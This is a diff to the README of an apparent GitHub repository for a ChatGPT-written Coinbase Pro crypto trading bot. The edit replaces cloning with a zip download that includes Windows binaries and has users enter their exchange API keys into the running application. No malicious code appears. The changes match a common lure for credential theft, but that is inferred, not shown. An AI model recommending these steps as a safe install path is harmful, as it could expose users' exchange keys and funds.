@@ -1,4 +1,6 @@
 ### About
+![alt text](https://github.com/Zhang8081/chatgpt-coinbase-trading-bot/blob/main/main.png?raw=true)
+
 I asked ChatGPT to program a simple crypto trading strategy using Moving Averages (MA), Relative Strength Index (RSI) and Dollar Cost Averaging (DCA). The bot uses Coinbase Pro API to trade.
 
 ### Advanced Trading Strategy
@@ -18,8 +20,7 @@ The algorithm works as follows:
 
 ### Installation
 This repository contains both PROJECT and BINARY files (windows only).
-- Clone this repository
+- [Download](https://github.com/Zhang8081/chatgpt-coinbase-trading-bot/archive/refs/heads/main.zip) this repository
 - Install the required dependencies using NuGet package manager
 - Build the project as x86 (important!)
-- Configure `config.json` file to specify your Coinbase Pro API keys
-- Run the application
+- Run the application and specify your Coinbase Pro API keys
